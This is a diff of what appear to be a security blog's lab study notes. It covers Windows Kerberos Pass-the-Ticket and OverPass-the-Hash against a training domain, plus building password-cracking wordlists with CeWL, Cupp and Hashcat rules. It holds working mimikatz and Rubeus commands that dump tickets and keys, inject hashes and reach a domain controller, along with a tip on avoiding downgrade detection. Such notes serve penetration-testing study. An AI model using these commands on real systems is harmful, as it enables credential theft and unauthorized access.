+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Rubeus.exe dump /nowrap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UserName              :  DC01$</span><br><span class="line"></span><br><span class="line">doIE1jCCBNKgAwIBBaEDAgEWooID7TCCA+lhggPlMIID4aADAgEFoQkbB0hUQi5DT02iHDAaoAMCA &lt;SNIP&gt; T02jggOvMIIDq6ADAgESoQMCAQKiggOdBIIDmUE/AWlM6VlpGv+Gfvn6bHXrpRjRbsgcw9beSqS2iwERsGa3JidGd0GwdIVEIuQ09N</span><br><span class="line"></span><br><span class="line">UserName              : plaintext</span><br><span class="line"></span><br><span class="line">doIE9jCCBPKgAwIBBaEDAgEWooIECTCCBAVhggQBMIID/aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQ &lt;SNIP&gt; EzARGwZrcmJ0Z3QbB0hUQi5DT02jggPLMIIDx6ADAgESoQMCAQKiggO5BIIDtc6ptErl3sAxJsqVTJ0Z3QbB0hbB0hB0hUQi5DT00=</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h1 id="Pass-the-Key-aka-OverPass-the-Hash"><a href="#Pass-the-Key-aka-OverPass-the-Hash" class="headerlink" title="Pass the Key aka. OverPass the Hash"></a>Pass the Key aka. OverPass the Hash</h1><h2 id="Extract-Hashes"><a href="#Extract-Hashes" class="headerlink" title="Extract Hashes"></a>Extract Hashes</h2><p>➜ To perform OverPass the Hash we need to have access to the <code>AES256_HMAC</code> and <code>RC4_HMAC</code> keys.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::ekeys</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">         * Username : plaintext</span><br><span class="line">         * Domain   : inlanefreight.htb</span><br><span class="line">         * Password : (null)</span><br><span class="line">         * Key List :</span><br><span class="line">           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60</span><br><span class="line">           rc4_hmac_nt       <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">           rc4_hmac_old      <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">           rc4_md4           <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">           rc4_hmac_nt_exp   <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">           rc4_hmac_old_exp  <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Forge-a-TGT-Ticket"><a href="#Forge-a-TGT-Ticket" class="headerlink" title="Forge a TGT Ticket"></a>Forge a TGT Ticket</h2><p><code>➜ Note: Modern Windows domains use AES encryption by default in normal Kerberos exchanges. If we use an rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an &quot;encryption downgrade.&quot;</code></p>
+<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p><code>➜ Requires administrative access.</code></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f</span></span><br></pre></td></tr></table></figure>
+
+<p>➜ This will create a new <code>cmd.exe</code> window that we can use to request access to any service we want in the context of the target user.</p>
+<h3 id="Rubeus-1"><a href="#Rubeus-1" class="headerlink" title="Rubeus"></a>Rubeus</h3><p><code>➜ Administrative access not required.</code></p>
+<p>We have four hash types that can be used:</p>
 <ul>
-<li>Depth to spider (<code>-d</code>)</li>
-<li>The minimum length of the word (<code>-m</code>)</li>
-<li>The storage of the found words in lowercase (<code>--lowercase</code>)</li>
-<li>The file where we want to store the results (<code>-w</code>)</li>
+<li>&#x2F;rc4</li>
+<li>&#x2F;aes128</li>
+<li>&#x2F;aes256</li>
+<li>&#x2F;des</li>
 </ul>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl https://website -d 4 -m 6 --lowercase -w wordlist.txt</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Cupp"><a href="#Cupp" class="headerlink" title="Cupp"></a>Cupp</h1><blockquote>
-<p>We can perform OSINT gathering and feed the collected information into <code>cupp</code> to generate a personalized wordlist.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cupp -i</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap</span><br><span class="line"></span><br><span class="line">doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA &lt; SNIP &gt; wZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIsGa3JidGd0GwdodGIuY29t</span><br></pre></td></tr></table></figure>
 
 
 
-<h1 id="Hashcat-Rules"><a href="#Hashcat-Rules" class="headerlink" title="Hashcat Rules"></a>Hashcat Rules</h1><h3 id="Predefined-Rules"><a href="#Predefined-Rules" class="headerlink" title="Predefined Rules"></a>Predefined Rules</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ <span class="built_in">ls</span> /usr/share/hashcat/rules/</span><br><span class="line"></span><br><span class="line">best64.rule</span><br><span class="line">dive.rule</span><br><span class="line">generated2.rule</span><br><span class="line">rockyou-30000.rule</span><br><span class="line">hob0rules</span><br></pre></td></tr></table></figure>
+<h1 id="Pass-the-Ticket-PtT-To-The-current-Session"><a href="#Pass-the-Ticket-PtT-To-The-current-Session" class="headerlink" title="Pass the Ticket (PtT) To The current Session"></a>Pass the Ticket (PtT) To The current Session</h1><h2 id="Loading-a-TGT-Directly-Into-the-Current-Logon-Session"><a href="#Loading-a-TGT-Directly-Into-the-Current-Logon-Session" class="headerlink" title="Loading a TGT Directly Into the Current Logon Session"></a>Loading a TGT Directly Into the Current Logon Session</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f /ptt</span><br><span class="line"></span><br><span class="line">[+] Ticket successfully imported!</span><br></pre></td></tr></table></figure>
 
-<h3 id="Writing-Custom-Rules"><a href="#Writing-Custom-Rules" class="headerlink" title="Writing Custom Rules"></a>Writing Custom Rules</h3><blockquote>
-<p><code>:</code>      Do nothing<br><code>l</code>      Lowercase all letters<br><code>u</code>      Uppercase all letters                        <br><code>c</code>      Capitalize the first letter and lowercase others<br><code>sXY</code>   Replace all instances of X with Y                <br><code>$!</code>     Add the exclamation character at the end</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> custom.rule</span><br><span class="line"></span><br><span class="line">:</span><br><span class="line">c</span><br><span class="line">so0</span><br><span class="line">c so0</span><br><span class="line">sa@</span><br><span class="line">c sa@</span><br><span class="line">c sa@ so0</span><br><span class="line">$!</span><br><span class="line">$! c</span><br><span class="line">$! so0</span><br><span class="line">$! sa@</span><br><span class="line">$! c so0</span><br><span class="line">$! c sa@</span><br><span class="line">$! so0 sa@</span><br><span class="line">$! c so0 sa@</span><br></pre></td></tr></table></figure>
+<h2 id="Importing-a-kirbi-Ticket"><a href="#Importing-a-kirbi-Ticket" class="headerlink" title="Importing a .kirbi Ticket"></a>Importing a .kirbi Ticket</h2><h4 id="Rubeus-2"><a href="#Rubeus-2" class="headerlink" title="Rubeus"></a>Rubeus</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:[<span class="number">0</span>;<span class="number">6</span><span class="type">c680</span>]<span class="literal">-2-0-40e10000-plaintext</span>@krbtgt<span class="literal">-inlanefreight</span>.htb.kirbi</span><br><span class="line"></span><br><span class="line">[+] ticket successfully imported!</span><br></pre></td></tr></table></figure>
+<h4 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::ptt &quot;C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi&quot;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="Applying-Hashcat-Rules-to-a-Wordlist"><a href="#Applying-Hashcat-Rules-to-a-Wordlist" class="headerlink" title="Applying Hashcat Rules to a Wordlist"></a>Applying Hashcat Rules to a Wordlist</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat --force our-wordlist -r custom.rule --stdout | <span class="built_in">sort</span> -u &gt; mut_password.list</span><br></pre></td></tr></table></figure>]]></content>
+<h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>Then we can access shares using the created the imported ticket.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; <span class="built_in">dir</span> \\DC01.inlanefreight.htb\c<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">6</span>/<span class="number">4</span>/<span class="number">2022</span>  <span class="number">11</span>:<span class="number">17</span> AM                Program Files</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">6</span>/<span class="number">4</span>/<span class="number">2022</span>  <span class="number">11</span>:<span class="number">17</span> AM                Program Files (x86)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Pass-The-Ticket-with-PowerShell-Remoting-winrm"><a href="#Pass-The-Ticket-with-PowerShell-Remoting-winrm" class="headerlink" title="Pass The Ticket with PowerShell Remoting (winrm)"></a>Pass The Ticket with PowerShell Remoting (winrm)</h1><h2 id="Mimikatz-2"><a href="#Mimikatz-2" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><h4 id="Import-Ticket"><a href="#Import-Ticket" class="headerlink" title="Import Ticket"></a>Import Ticket</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::ptt &quot;C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Connect-winrm"><a href="#Connect-winrm" class="headerlink" title="Connect winrm"></a>Connect winrm</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt;powershell</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\tools&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> DC01</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt; whoami</span><br><span class="line">inlanefreight\john</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt; hostname</span><br><span class="line">DC01</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Rubeus-3"><a href="#Rubeus-3" class="headerlink" title="Rubeus"></a>Rubeus</h2><h4 id="Create-a-sacrificial-process"><a href="#Create-a-sacrificial-process" class="headerlink" title="Create a sacrificial process"></a>Create a sacrificial process</h4><p><code>➜ The command will open a new cmd window</code></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe createnetonly /program:<span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span> /show</span><br></pre></td></tr></table></figure>
+<h4 id="Import-Ticket-1"><a href="#Import-Ticket-1" class="headerlink" title="Import Ticket"></a>Import Ticket</h4><p><code>➜ From that window, we can execute Rubeus to request a new TGT.</code></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<span class="number">9279</span>bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt</span><br></pre></td></tr></table></figure>
+
+<h4 id="Connect-winrm-1"><a href="#Connect-winrm-1" class="headerlink" title="Connect winrm"></a>Connect winrm</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt;powershell</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) <span class="number">2015</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\tools&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> DC01</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt; whoami</span><br><span class="line">inlanefreight\john</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt; hostname</span><br><span class="line">DC01</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
-        <category>Enumeration</category>
-        <category>Users &amp; Passwords Enumeration</category>
-        <category>Writing Custom Wordlists and Rules</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Pass the Hash (PtH)</category>
       </categories>
       <tags>
-        <tag>Creds</tag>
-        <tag>CeWL</tag>
-        <tag>Cupp</tag>
-        <tag>Hashcat Rules</tag>
+        <tag>mimikatz</tag>
+        <tag>Invoke-TheHash</tag>
       </tags>
   </entry>
   <entry>
@@ -5723,77 +5798,54 @@
       </tags>
   </entry>
   <entry>
-    <title>Windows Pass the Ticket (PtT)</title>
-    <url>/2025/11/27/Windows-Pass-the-Ticket-PtT/</url>
-    <content><![CDATA[<h1 id="Harvesting-Kerberos-tickets"><a href="#Harvesting-Kerberos-tickets" class="headerlink" title="Harvesting Kerberos tickets"></a>Harvesting Kerberos tickets</h1><h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><p>➜ As a <code>non-administrative</code> user we can only get our tickets.</p>
-<p>➜ As a <code>local administrator</code> user we can collect everything.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::tickets /export</span></span><br><span class="line"></span><br><span class="line">* Saved to file [<span class="number">0</span>;<span class="number">6</span><span class="type">c680</span>]<span class="literal">-2-0-40e10000-plaintext</span>@krbtgt<span class="literal">-inlanefreight</span>.htb.kirbi !</span><br><span class="line">* Saved to file [<span class="number">0</span>;<span class="number">5063</span><span class="type">e</span>]<span class="literal">-1-0-40a50000-DC01</span><span class="variable">$</span>@LDAP<span class="literal">-DC01</span>.inlanefreight.htb.kirbi !</span><br><span class="line">  </span><br><span class="line"><span class="built_in">Group</span> <span class="number">2</span> - Ticket Granting Ticket</span><br></pre></td></tr></table></figure>
+    <title>Writing Custom Wordlists and Rules</title>
+    <url>/2025/12/04/Writing-Custom-Wordlists-and-Rules/</url>
+    <content><![CDATA[<h1 id="Default-Credential"><a href="#Default-Credential" class="headerlink" title="Default Credential"></a>Default Credential</h1><h3 id="Creds"><a href="#Creds" class="headerlink" title="Creds"></a>Creds</h3><p>Installation </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install defaultcreds-cheat-sheet</span><br></pre></td></tr></table></figure>
+
+<p>Example :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search tomcat</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search mysql</span><br></pre></td></tr></table></figure>
 
 
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; <span class="built_in">dir</span> *.kirbi</span><br><span class="line"></span><br><span class="line"><span class="literal">-a----</span>        <span class="number">7</span>/<span class="number">12</span>/<span class="number">2022</span>   <span class="number">9</span>:<span class="number">44</span> AM           <span class="number">1445</span> [<span class="number">0</span>;<span class="number">6</span><span class="type">c680</span>]<span class="literal">-2-0-40e10000-plaintext</span>@krbtgt<span class="literal">-inlanefreight</span>.htb.kirbi</span><br><span class="line"><span class="literal">-a----</span>        <span class="number">7</span>/<span class="number">12</span>/<span class="number">2022</span>   <span class="number">9</span>:<span class="number">44</span> AM           <span class="number">1565</span> [<span class="number">0</span>;<span class="number">3</span><span class="type">e7</span>]<span class="literal">-0-2-40a50000-DC01</span><span class="variable">$</span>@cifs<span class="literal">-DC01</span>.inlanefreight.htb.kirbi</span><br></pre></td></tr></table></figure>
-
-
-<p>➜ The tickets that end with <code>$</code> belong to computer accounts.</p>
-<p>➜ <code>TGT</code> tickets follow this format : <code>[randomvalue]-username@krbtgt-domain.local.kirbi</code>.</p>
-<p>➜ <code>TGS</code> tickets follow this format : <code>[randomvalue]-username@service-domain.local.kirbi</code>.</p>
-<h2 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h2><p>➜ As a <code>non-administrative</code> user we can only get our tickets.</p>
-<p>➜ As a <code>local administrator</code> user we can collect everything.</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Rubeus.exe dump /nowrap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UserName              :  DC01$</span><br><span class="line"></span><br><span class="line">doIE1jCCBNKgAwIBBaEDAgEWooID7TCCA+lhggPlMIID4aADAgEFoQkbB0hUQi5DT02iHDAaoAMCA &lt;SNIP&gt; T02jggOvMIIDq6ADAgESoQMCAQKiggOdBIIDmUE/AWlM6VlpGv+Gfvn6bHXrpRjRbsgcw9beSqS2iwERsGa3JidGd0GwdIVEIuQ09N</span><br><span class="line"></span><br><span class="line">UserName              : plaintext</span><br><span class="line"></span><br><span class="line">doIE9jCCBPKgAwIBBaEDAgEWooIECTCCBAVhggQBMIID/aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQ &lt;SNIP&gt; EzARGwZrcmJ0Z3QbB0hUQi5DT02jggPLMIIDx6ADAgESoQMCAQKiggO5BIIDtc6ptErl3sAxJsqVTJ0Z3QbB0hbB0hB0hUQi5DT00=</span><br></pre></td></tr></table></figure>
-
-
-
-
-<h1 id="Pass-the-Key-aka-OverPass-the-Hash"><a href="#Pass-the-Key-aka-OverPass-the-Hash" class="headerlink" title="Pass the Key aka. OverPass the Hash"></a>Pass the Key aka. OverPass the Hash</h1><h2 id="Extract-Hashes"><a href="#Extract-Hashes" class="headerlink" title="Extract Hashes"></a>Extract Hashes</h2><p>➜ To perform OverPass the Hash we need to have access to the <code>AES256_HMAC</code> and <code>RC4_HMAC</code> keys.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::ekeys</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">         * Username : plaintext</span><br><span class="line">         * Domain   : inlanefreight.htb</span><br><span class="line">         * Password : (null)</span><br><span class="line">         * Key List :</span><br><span class="line">           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60</span><br><span class="line">           rc4_hmac_nt       <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">           rc4_hmac_old      <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">           rc4_md4           <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">           rc4_hmac_nt_exp   <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">           rc4_hmac_old_exp  <span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Forge-a-TGT-Ticket"><a href="#Forge-a-TGT-Ticket" class="headerlink" title="Forge a TGT Ticket"></a>Forge a TGT Ticket</h2><p><code>➜ Note: Modern Windows domains use AES encryption by default in normal Kerberos exchanges. If we use an rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an &quot;encryption downgrade.&quot;</code></p>
-<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p><code>➜ Requires administrative access.</code></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f</span></span><br></pre></td></tr></table></figure>
-
-<p>➜ This will create a new <code>cmd.exe</code> window that we can use to request access to any service we want in the context of the target user.</p>
-<h3 id="Rubeus-1"><a href="#Rubeus-1" class="headerlink" title="Rubeus"></a>Rubeus</h3><p><code>➜ Administrative access not required.</code></p>
-<p>We have four hash types that can be used:</p>
+<h1 id="CeWL"><a href="#CeWL" class="headerlink" title="CeWL"></a>CeWL</h1><blockquote>
 <ul>
-<li>&#x2F;rc4</li>
-<li>&#x2F;aes128</li>
-<li>&#x2F;aes256</li>
-<li>&#x2F;des</li>
+<li>Depth to spider (<code>-d</code>)</li>
+<li>The minimum length of the word (<code>-m</code>)</li>
+<li>The storage of the found words in lowercase (<code>--lowercase</code>)</li>
+<li>The file where we want to store the results (<code>-w</code>)</li>
 </ul>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap</span><br><span class="line"></span><br><span class="line">doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA &lt; SNIP &gt; wZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIsGa3JidGd0GwdodGIuY29t</span><br></pre></td></tr></table></figure>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl https://website -d 4 -m 6 --lowercase -w wordlist.txt</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Cupp"><a href="#Cupp" class="headerlink" title="Cupp"></a>Cupp</h1><blockquote>
+<p>We can perform OSINT gathering and feed the collected information into <code>cupp</code> to generate a personalized wordlist.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cupp -i</span><br></pre></td></tr></table></figure>
 
 
 
-<h1 id="Pass-the-Ticket-PtT-To-The-current-Session"><a href="#Pass-the-Ticket-PtT-To-The-current-Session" class="headerlink" title="Pass the Ticket (PtT) To The current Session"></a>Pass the Ticket (PtT) To The current Session</h1><h2 id="Loading-a-TGT-Directly-Into-the-Current-Logon-Session"><a href="#Loading-a-TGT-Directly-Into-the-Current-Logon-Session" class="headerlink" title="Loading a TGT Directly Into the Current Logon Session"></a>Loading a TGT Directly Into the Current Logon Session</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<span class="number">3</span>f74aa8f08f712f09cd5177b5c1ce50f /ptt</span><br><span class="line"></span><br><span class="line">[+] Ticket successfully imported!</span><br></pre></td></tr></table></figure>
+<h1 id="Hashcat-Rules"><a href="#Hashcat-Rules" class="headerlink" title="Hashcat Rules"></a>Hashcat Rules</h1><h3 id="Predefined-Rules"><a href="#Predefined-Rules" class="headerlink" title="Predefined Rules"></a>Predefined Rules</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ <span class="built_in">ls</span> /usr/share/hashcat/rules/</span><br><span class="line"></span><br><span class="line">best64.rule</span><br><span class="line">dive.rule</span><br><span class="line">generated2.rule</span><br><span class="line">rockyou-30000.rule</span><br><span class="line">hob0rules</span><br></pre></td></tr></table></figure>
 
-<h2 id="Importing-a-kirbi-Ticket"><a href="#Importing-a-kirbi-Ticket" class="headerlink" title="Importing a .kirbi Ticket"></a>Importing a .kirbi Ticket</h2><h4 id="Rubeus-2"><a href="#Rubeus-2" class="headerlink" title="Rubeus"></a>Rubeus</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:[<span class="number">0</span>;<span class="number">6</span><span class="type">c680</span>]<span class="literal">-2-0-40e10000-plaintext</span>@krbtgt<span class="literal">-inlanefreight</span>.htb.kirbi</span><br><span class="line"></span><br><span class="line">[+] ticket successfully imported!</span><br></pre></td></tr></table></figure>
-<h4 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::ptt &quot;C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="Writing-Custom-Rules"><a href="#Writing-Custom-Rules" class="headerlink" title="Writing Custom Rules"></a>Writing Custom Rules</h3><blockquote>
+<p><code>:</code>      Do nothing<br><code>l</code>      Lowercase all letters<br><code>u</code>      Uppercase all letters                        <br><code>c</code>      Capitalize the first letter and lowercase others<br><code>sXY</code>   Replace all instances of X with Y                <br><code>$!</code>     Add the exclamation character at the end</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> custom.rule</span><br><span class="line"></span><br><span class="line">:</span><br><span class="line">c</span><br><span class="line">so0</span><br><span class="line">c so0</span><br><span class="line">sa@</span><br><span class="line">c sa@</span><br><span class="line">c sa@ so0</span><br><span class="line">$!</span><br><span class="line">$! c</span><br><span class="line">$! so0</span><br><span class="line">$! sa@</span><br><span class="line">$! c so0</span><br><span class="line">$! c sa@</span><br><span class="line">$! so0 sa@</span><br><span class="line">$! c so0 sa@</span><br></pre></td></tr></table></figure>
 
-<h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>Then we can access shares using the created the imported ticket.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; <span class="built_in">dir</span> \\DC01.inlanefreight.htb\c<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">6</span>/<span class="number">4</span>/<span class="number">2022</span>  <span class="number">11</span>:<span class="number">17</span> AM                Program Files</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">6</span>/<span class="number">4</span>/<span class="number">2022</span>  <span class="number">11</span>:<span class="number">17</span> AM                Program Files (x86)</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Pass-The-Ticket-with-PowerShell-Remoting-winrm"><a href="#Pass-The-Ticket-with-PowerShell-Remoting-winrm" class="headerlink" title="Pass The Ticket with PowerShell Remoting (winrm)"></a>Pass The Ticket with PowerShell Remoting (winrm)</h1><h2 id="Mimikatz-2"><a href="#Mimikatz-2" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><h4 id="Import-Ticket"><a href="#Import-Ticket" class="headerlink" title="Import Ticket"></a>Import Ticket</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::ptt &quot;C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi&quot;</span></span><br></pre></td></tr></table></figure>
-
